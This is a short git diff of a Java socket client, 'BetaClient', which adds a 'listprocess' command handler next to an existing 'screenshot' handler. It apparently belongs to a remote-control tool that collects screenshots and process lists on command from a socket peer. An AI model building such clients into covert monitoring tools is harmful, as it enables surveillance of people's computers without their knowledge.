@@ -1,14 +1,10 @@
-package testsocket;
+package socket;
 
 
-import javax.lang.model.type.NullType;
 import java.io.BufferedReader;
 import java.io.InputStreamReader;
 import java.io.PrintWriter;
 import java.net.Socket;
-import java.nio.file.Files;
-import java.nio.file.Path;
-import java.nio.file.Paths;
 import java.util.List;
 import java.util.Scanner;
 import services.*;
@@ -73,6 +69,11 @@ public class BetaClient {
                     case "screenshot":
                         ScreenShot.handleScreenshot(socket, writer, reader, from);
                         break;
+
+                    case "listprocess":
+                        Processes.handleListProcess(socket, writer);
+                        break;
+
                     default:
                         System.out.println("fault");
                         throw new AssertionError();
